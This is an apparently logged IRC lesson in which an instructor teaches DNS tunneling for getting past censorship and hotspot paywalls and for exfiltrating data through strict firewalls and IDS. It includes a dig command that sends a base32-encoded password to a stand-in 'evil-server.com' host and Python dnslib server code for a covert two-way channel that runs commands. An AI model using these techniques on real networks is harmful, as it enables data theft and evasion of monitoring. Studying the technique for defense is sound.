@@ -1,0 +1,379 @@
+<&mona> shhh
+<&mona> no tears
+<&mona> right
+<&mona> i will recap it very quickly
+<&mona> because honestly it's basic shit
+<&mona> DNS is essential to the functioning of the internet
+<&mona> before you can load up neopets.com or fetlife
+<&mona> your browser queries a nameserver
+<&mona> that tells it "fetlife is 1.2.3.4, you disgusting deviant"
+<&mona> there's an elaborate setup of DNS nameservers, and the protocol itself is very simple
+<&mona> it runs on UDP, port 53
+<&mona> basically a DNS server has a bunch of files called zone file
+<&mona> each one is associated with a domain and has info on stuff like
+<&mona> what that domain's nameservers are, what its mailservers are, etc. etc.
+<&mona> right, so that's DNS?
+<&mona> why is that relevant to censorship or exfiltration?
+<&mona> the part you should have picked up is that DNS is essential
+<&mona> to the functioning of the Internet
+<&mona> you can't block DNS
+<&mona> if you want your users to be able to resolve domain names
+<&mona> this means that if you are on a restrictive network
+<&mona> such as one that will detect your clumsy fucking ncat reverse bindshell
+<&mona> or one that practices active censorship
+<&mona> or, the most common example
+<&mona> some open hotspot that redirects you to a paywall
+<&mona> you can get around this by disguising your traffic as DNS requests and response
+<&mona> this is not just "running a shell over port 53 UDP"
+<&mona> this is crafting legitimate-looking DNS requests and embedding your data into them
+<&mona> and sending them to a server controlled by you, which sends legitimate-looking DNS responses
+<&mona> which also have embedded data
+<&mona> everyone clear so far
+<&mona> and what we're doing
+<&mona> and why we're doing it
+< kr0_> wait
+< Bl4d3dsh4rd> So far So good
+< McL0u1s> yep
+< diamine> sure
+< Alfred> Yea
+< Shadow> wut different in 8.8.4.4 and 8.8.8.8
+< lorimeyer> how do I turn on computer
+< kashloca> yeah sure
+< benis> how do magnets work?
+< DreadPirateRoberts> wouldn't the open hotspot be blocking all connections to ip address's other than the ones 
+                           they own
+<&mona> Shadow: those are 2 exapmples of DNS nameservers
+< NullMind> so i just arrived is this a lesson on dns?
+<&mona> ok
+< Shadow> ok
+<&mona> it's a lesson on dns tunneling
+< DreadPirateRoberts> nevermind, this is about dns
+<&mona> just a quick recap
+<&mona> so we're all on the same page
+< lorimeyer> I want to turn on pc
+< NullMind> ok
+< DreadPirateRoberts> how does this work mona http://www.shellntel.com/blog/2016/3/30/vpn-over-dns-1 
+< Shadow> ??? lorimeyet
+<&mona> DreadPirateRoberts: that's one way of blocking DNS tunneling that you've hit on
+<&mona> which some providers try to do
+< operativem3> Is this going to a log? I just got in and don't really get so much yet
+<&mona> it doesnt work
+<&mona> but some try to whitelist
+< Bl4d3dsh4rd> Well isn't DNS tunneling insecure.  Because if your using a DNs server that is not your own.  Than 
+                    that DNs server can see exactly what your doing.
+< Shadow> u cant type if ur pc isnt turn on
+<&mona> Bl4d3dsh4rd: you're not using a DNS server that is not your own
+<&mona> also, encryption
+< lorimeyer> how shadow?
+< Bl4d3dsh4rd> Fair enough
+<&mona> ok
+<&mona> so like I said
+<&mona> DNS servers have zone files, which are composed of records
+<&mona> there's a bunch of them and many of them can be used in DNS tunneling if one is blocked
+<&mona> the most conveient is the TXT record though
+<&mona> TXT records can hold 255 bytes of ASCII data
+<&mona> and are used to hold miscellaneous data about the nameserver, often used for anti-spam stuff etc
+<&mona> you can have as many TXT records as you want in a zone file
+<&mona> so for this tutorial
+<&mona> we'll be focussing on using TXT records for DNS tunneling
+<&mona> keep in mind that others are possible though
+<&mona> so there are various tools to tunnel over DNS
+<&mona> and you can also write your own
+<&mona> but i'm going to show you how to do it manually
+<&mona> to help you understand how it works exactly
+<&mona> let's say for the sake of the example
+<&mona> that you have a string you want to send via the DNS protocol
+<&mona> the string in this example is "The password is XXZZYY"
+<&mona> what we're going to do is make a DNS request
+<&mona> but instead of requesting a domain like google.com
+<&mona> we'll use that string
+<&mona> we'll base32-encode it to avoid any illegal characters
+<&mona> $ echo "The password is XXZZYY" | base32 > pass.b32
+<&mona> so now we have a file with our base32-encoded string
+<&mona> KRUGKIDQMFZXG53POJSCA2LTEBMFQWS2LFMQU===
+<&mona> is what that translates to
+<&mona> so now we can make a DNS request, and instead of requesting "google.com"'s IP or whatever
+<&mona> we're requesting the IP of "KRUGKIDQMFZXG53POJSCA2LTEBMFQWS2LFMQU==="
+<&mona> obviously
+<&mona> that's an insane request
+<&mona> and if you send that request to a real DNS server
+<&mona> it will respond telling you that domain doesn't exist
+<&mona> but the point is that we've managed to embed our string into what looks like a DNS request
+<&mona> you can do this manually for testing purposes with dig:
+<&mona> $ dig @evil-server.com $(cat password.b32) +tries=1
+<&mona> if you run that command and you're sniffing your network interfaces with tcpdump
+<&mona> you'll see something like:
+<&mona> myhost.42737 > evil-server.com.domain: 26111+ [1au] TXT? KRUGKIDQMFZXG53POJSCA2LTEBMFQWS2LFMQU===. (69)
+<&mona> tcpdump reads it as a legitimate DNS request
+<&mona> of course, unless evil-server.com is configured to respond to this insane DNS request with its own 
+             response
+<&mona> dig will report that the DNS lookup failed
+<&mona> you can test it out with ncat though
+<&mona> if you listen on port 53 UDP with ncat:
+<&mona> $ ncat -l -p 53 --udp
+<&mona> then do:
+<&mona> $ dig @127.0.0.1 $(cat pass.b32) +tries=1
+<&mona> the request will show up in ncat
+<&mona> you can see some random binary shit, which is your DNS headers
+<&mona> and our string
+<&mona> questions so far?
+< lorimeyer> how can I see this chat room if my PC is off?
+< DreadPirateRoberts> nopd
+<&mona> that's a very clunky shitty example of a 1-way dns tunnel
+<&mona> you will never do this shit manually
+<&mona> but it's a good way to learn exactly how it works
+< Gaylien> i missed the beginning. will this lesson be logged?
+<&mona> yes
+< Gaylien> <3
+< Shadow> the last mini lesson
+< Shadow> cant find it
+< Santa> related link: http://resources.infosecinstitute.com/dns-tunnelling/
+< NullMind> so +tries=1 does what?
+< DreadPirateRoberts> http://pastie.org/10836351 for the start
+<&mona> not relevant
+< Santa> interesting concept
+<&mona> NullMind: tells it to only try once
+< NullMind> ok
+< DreadPirateRoberts> gay
+< sourcefish> mona, doesn't most corps restrict access for all hosts to their inside DNS and only those DNSes may 
+                   do lookups to the external one, which in turn do the lookup on Internet. and what about IDSes ? I 
+                   guess that most corps have at least a vanilla security onion installation with free ET rules etc.. 
+                   they usually to howl like hell about strange lookups..
+<&mona> because our ncat isn't replying with a valid DNS response
+< zelith> do we have to use port 53 UDP
+< Munly1993> should we be following along? because I don't have ncat/tcpdump/dig installed
+< Gaylien> this looks cool. but a bit advanced. i hope i can catch up!
+< siuad> any particular reasons for using base32 instead of base64?
+< Gaylien> i don't know what that is, even.
+< lorimeyer> the on button can be complicated on a pc
+<&mona> zelith: you don't have to, but it's the most likely to be unblocked
+<&mona> siuad: 
+<&mona> base32 is A-Z, 2-9 and = only
+< zelith> ok
+<&mona> it's a bit safer
+<&mona> base64 would probably be ok
+<&mona> but base32 you can be sure there's no illegal characters
+<&mona> tha will flag up as not being a domain name
+< kashloca> is dns limited in the data we can send with for exfiltration??
+<&mona> kashloca: the size is limited, but you can fragment
+<&mona> i'll get to that in a sec
+<&mona> sourcefish: 
+< zelith> can this be used to make your own email service
+<&mona> it varies
+< Secrypt> Protonmail
+<&mona> DNS is very frequently overlooked
+<&mona> however, a well configured IDS might pick this up
+< lorimeyer> shit how you turn on PC that what I want to know.
+<&mona> it is true that some corps try to mitigate this
+<&mona> by whitelisting certain DNS servers
+<&mona> and blocking all the others
+<&mona> but you can get around that
+<&mona> right now i'm just covering the basic technique though
+<&mona> we can get into more advanced variants later
+<&mona> ok, so i'm assuming everyone gets the basic concept
+< Lumpy69> kick lorimeyer
+<&mona> so
+<&mona> what have we managed to do so far
+<&mona> we've managed to embed some data
+<&mona> in a DNS request
+<&mona> which any real DNS server would reject
+<&mona> and send it to ncat
+<&mona> keep in mind the LABEL (i.e. the domain name you send as part of a DNS request) is limited to 64 bytes
+<&mona> which means if you want to send large amounts of data with DNS /requests/ rather than responses
+<&mona> it will be slow
+<&mona> and you'll need to fragment it a lot
+<&mona> that being said
+<&mona> what we have is a very basic, rudimentary, one-way DNS tunnel
+<&mona> we could theoretically pipe that ncat into a file
+<&mona> and send it whatever we want in 64-byte chunks
+<&mona> then strip the non-ascii out and convert back from base32
+<&mona> that's not very efficient though
+<&mona> in order to be really effective, we want two-way communication
+<&mona> and in order to send lots of data
+<&mona> we dont want to be limited to 64 bytes per request
+<&mona> we do this by hacking together a DNS "server"
+<&mona> I put server in quotes
+<&mona> because it's not a real DNS server
+<&mona> i.e., when it receives your nonsense DNS request
+<&mona> it's not going to try to resolve it
+<&mona> instead it will send back a legit-seeming DNS response
+<&mona> that can contain whatever you want
+<&mona> for example
+<&mona> your client program might send a DNS request that says
+<&mona> "evil-server.com, please tell me what TXT records the domain at 'uname -a' has"
+<&mona> and your server program would execute the command, uname-a
+<&mona> and respond
+<&mona> "client, the TXT records at 'uname -a' contain the following information:"
+<&mona> <output of uname -a>
+<&mona> in this way, we have created a two-way tunnel over the DNS protocol
+< lorimeyer> I think I have my PC turned on you guys I see a light thingy!!!
+<&mona> before i go into specifics
+<&mona> does that make sense to everyone
+< muerto> why would you do that
+< lorimeyers> thank you mona
+< NullMind> yes 
+< muerto> when you can just use tcp
+< muerto> lol??
+<&mona> ?
+<&mona> are you asking why you would tunnel over DNS?
+<&mona> in the first place?
+< muerto> dns responses are limited by the MTU so 556 bytes or smth
+< zelith> do we need port fowarding 
+< Shadow> yes
+< muerto> you know what
+< muerto> i don't know anything
+< muerto> put +m back please
+< NullMind> lol
+< muerto> and continue
+<&mona> haha
+< justforyou> lori being a pain?
+<&mona> <3
+< zelith> ok i try doing that on my computer but its not working
+< justforyou> im late srru
+<&mona> does everyone understand the theory here?
+<&mona> of what exactly is being done?
+< Bl4d3dsh4rd> In a sense
+< zelith> yea
+< Shadow> yaa
+< Bl4d3dsh4rd> The client is making the dns request.  But having the server request it back?   
+< NullMind> so dns is udp
+<@anonymous> .
+<@anonymous> oops
+< kashloca> yea
+<&mona> dns is udp, yes
+< kashloca> dns:53
+< kashloca> udp:53
+< Bl4d3dsh4rd> Iv also heard DNS being TCP aswell
+< wincinderith> yess
+< Bl4d3dsh4rd> Fascinating.    Okay than
+< Siam4k> so it's completely plain text
+< Siam4k> anyone can read them
+< Bl4d3dsh4rd> Makes sense.    
+<&mona> Siam4k: the protocol itself is plaintext
+< Shadow> i want to learn more about linux :/
+<&mona> there's no reason you can't
+< lorimeyers> justforyou: and others "lorimeyer" with no "S" at the end is mike the troll, my nickname ends with 
+                   "S"
+<&mona> encrypt your data
+< justforyou> ahh oke
+< justforyou> i see
+< Bl4d3dsh4rd> So then utilizing a VPN via DNS tunnel then makes it not plaintext?
+<&mona> anything that encrypts your data
+<&mona> will result in the data being encrypted
+< justforyou> mike at it again, oke sorry will not interrupt again go on...
+<&mona> obviously
+< zelith> what about 256 aes encrtypted
+< Bl4d3dsh4rd> Lol ^^^ Just asking questions is asll.  I though so
+<&mona> that is encryption, yes
+< zelith> is 256 better
+< kashloca> how they use dns to dos websites ??
+<&mona> which particular encryption method you elect to use isn't really relevant to dns tunneling
+< zelith> oh ok
+< siuad> as long as you base32 it XD
+<&mona> anyway
+<&mona> so
+<&mona> you can roll your own dns tunnel in python or the lang of your choice
+<&mona> it's pretty easy to do
+<&mona> all you need is a the ability to parse dns requests/responses and send them back and forth
+<&mona> that being said
+<&mona> you don't need to do so, there are several good tools out there that will take care of everything for you
+<&mona> dns2tcp is a common one, and dnscat is widely used because it is very simple
+<&mona> i will show you guys how to write your own dns tunnels in a bit
+<&mona> but it's worth mentioning the easy to use shit
+<&mona> it won't always suit your needs
+<&mona> muerto would like to inform you all that using tools is for skids, and you should write your own
+<&mona> i will teach you how to roll your own
+<&mona> in python
+<&mona> personall i prefer to use shit i've written myself over random crap downloaded off the internet
+<&mona> but tastes vary
+<&mona> you can google for dnscat and dns2tcp
+<&mona> they're extremely easy to use, pretty much anyone with 2 brain cells to rub together can do it
+<&mona> download and run a server, download and run a client
+<&mona> dns tunnel with shell+upload/download
+<&mona> ok
+<&mona> rolling your own
+<&mona> you can find libs/modules for parsing dns in p much every language
+<&mona> python tends to be my go-to for quick n dirty scripting
+<&mona> so, for python
+<&mona> all you need for udp dns tunneling is the socket and dnslibs modules
+< glados> finally
+<&mona> socket should be in your installation of python already, install dnslibs with pip or download the sources
+<&mona> so on the server side
+<&mona> obviously we need the basic udp socket setup, start listening on port 53
+<&mona> since we're imitating a dns server
+<&mona> Is = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+<&mona> Iport = 53
+<&mona> Is.bind(("", port))
+<&mona> packet, addr = s.recvfrom(1024)
+<&mona> that's just
+< muerto> err permision denied
+<&mona> create a udp socket
+< muerto> rekt
+< siuad> sudo apt install python-dnslib
+<&mona> bind it to port 53
+<&mona> wait to receive data
+<&mona> when you import dnslib i recommend importing all its members
+<&mona> i.e. from dnslib import *
+< kashloca> pip install dnslib
+<&mona> otherwise you'll be adding prefixes all over the place
+<&mona> anyway, when you receive a dns packet into your buffer
+<&mona> you can use dnslib to parse it
+<&mona> dnsreq = DNSRecord.parse(packet)
+<&mona> if you did "import dnslib" instead of "from dnslib import *"
+<&mona> you'd need to do dnslib.DNSRecord.parse(packet)
+< pixel> i missed half of the lesson
+<&mona> this converts the raw data you received into a DNSRecord object
+< pixel> is anyone recording the logs?
+< tracie> maybe lorimeyers shouldn't be here if she can't turn on pc
+<&mona> if you just print that variable (print dnsreq)
+<&mona> you'll get a dig-style dump of the DNS record
+<&mona> of the dns request* sorry
+<&mona> but you can also access specific headers and fields
+<&mona> for example
+<&mona> dnsreq.header.id for the id
+<&mona> dnsreq.q.qname for the name being requested
+<&mona> that one is particularly interesting to us because in the example give earlier, it contains our 
+             base32-encoded data
+<&mona> so you're writing your dns server
+<&mona> you've received a DNS request from the client
+<&mona> you've extracted the payload
+<&mona> and done whatever you need to do with it
+<&mona> still one-way communication, right?
+<&mona> now you need to send a DNS response back
+<&mona> in order to craft a valid response to the original DNS request, we'll need the qname and the id from the 
+             original request
+<&mona> so
+<&mona> qname = str(dnsreq.q.qname)
+<&mona> id = dnsreq.header.id
+<&mona> now (remember in this example we're responding to a TXT record request)
+<&mona> we can create a skeleton of a DNS record
+<&mona> response = DNSRecord(q=DNSQuestion(qname, QTYPE.TXT))
+<&mona> set the id with
+<&mona> response.header.id = id
+<&mona> and then we add whatever data we want to send with it:
+<&mona> response.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("this can be whatever you want it to be"), ttl=60))
+<&mona> remember
+<&mona> for UDP DNS:
+<&mona> label = 64 bytes max
+<&mona> 1 TXT record = 255 bytes max
+< muerto> please spoon feed me
+< tracie> lol
+<&mona> anyway, then you just call the objects pack() method (response.pack()) and send it back to the requester
+<&mona> s.sendto(response.pack(), addr)
+<&mona> writing the client code is basically the same but in reverse
+<&mona> i.e. you need to craft a DNS packet to send to the server, then parse the response
+<&mona> any questions?
+< Legacy> how many bits is 255 bytes?
+<&mona> any non-stupid questions?
+< NullMind> no just reading
+< lel> lol
+< wincinderith> so the method reason for tunneling is to inject code on to the destination server / the server 
+                     with the false DNS server?
+< wincinderith> by parsing the request content that you send it
+<&mona> the reason for tunneling is to wrap your traffic in DNS requests
+< wincinderith> using dig or something similiar
+<&mona> you might do this to bypass a filter such as those employed by open wifi hotspots
+< kashloca> there's no way to make sure that the packet resolved to its destination for the dns server or the 
+                 client?
+< lel> I missed today's lesson. How long until it's transcripted?
+<&mona> or to egress data on a server with strict firewalls or trigger-happy IDS
